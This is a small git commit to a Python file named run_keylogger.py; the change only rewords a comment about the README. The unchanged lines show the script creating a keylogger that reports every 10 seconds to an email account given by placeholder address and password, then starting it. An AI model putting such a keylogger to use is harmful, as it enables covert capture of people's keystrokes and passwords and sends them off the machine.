ed67d0a74d9471c98e4917b4a2980d47bc00c341
Chris Von Wilpert <vonwilpertc@gmail.com>
2022-06-12 15:06:54 -0700

    Misc Changes

--- run_keylogger.py
+++ run_keylogger.py
@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 import keylogger
 
-# See README.txt for clarification on what to enter here
+# See README file for clarification on what to enter here
 my_keylogger = keylogger.Keylogger(10, "your_email@gmail.com", "your_email_password")
 my_keylogger.start()
